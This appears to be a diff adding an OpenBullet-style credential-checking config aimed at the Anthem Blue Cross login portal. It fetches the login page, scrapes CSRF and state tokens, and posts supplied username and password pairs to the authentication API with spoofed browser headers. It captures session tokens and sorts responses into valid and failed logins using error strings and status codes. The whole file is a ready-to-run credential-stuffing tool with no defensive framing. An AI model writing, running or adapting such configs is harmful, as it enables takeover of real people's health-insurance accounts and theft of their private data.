@@ -1,0 +1,65 @@
+BLOCK:HttpRequest
+LABEL:GetLoginPage
+  url = "https://login.anthembluecross.com/"
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+  $""
+  ""
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractCSRFToken
+  input = @data.SOURCE
+  leftDelim = "name=\"_csrf\" value=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @CSRFToken
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractStateToken
+  input = @data.SOURCE
+  leftDelim = "name=\"stateToken\" value=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @StateToken
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Login
+  url = "https://login.anthembluecross.com/api/v1/authn"
+  method = POST
+
+  customHeaders = {("accept", "application/json"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("content-type", "application/json"), ("origin", "https://login.anthembluecross.com"), ("referer", "https://login.anthembluecross.com/"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")}
+
+  TYPE:STANDARD
+  $"{""username"":""@input.USER"",""password"":""@input.PASS"",""options"":{""warnBeforePasswordExpired"":true,""multiOptionalFactorEnroll"":true}}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractSessionToken
+  input = @data.SOURCE
+  leftDelim = """sessionToken"":"""
+  rightDelim = ""","
+  MODE:LR
+  => VAR @SessionToken
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains ""errorCauses""
+    STRINGKEY @data.SOURCE Contains ""errorSummary""
+    STRINGKEY @data.SOURCE Contains ""Authentication failed""
+    STRINGKEY @data.SOURCE Contains ""Invalid username or password""
+    STRINGKEY @data.SOURCE Contains ""E0000004""
+    STRINGKEY @data.SOURCE Contains ""E0000001""
+    STRINGKEY @data.RESPONSECODE Contains "401"
+    STRINGKEY @data.RESPONSECODE Contains "403"
+    STRINGKEY @data.RESPONSECODE Contains "400"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains ""status"":""SUCCESS""
+    STRINGKEY @data.SOURCE Contains ""sessionToken""
+    STRINGKEY @data.SOURCE Contains ""expiresAt""
+    STRINGKEY @data.RESPONSECODE Contains "200"
+ENDBLOCK
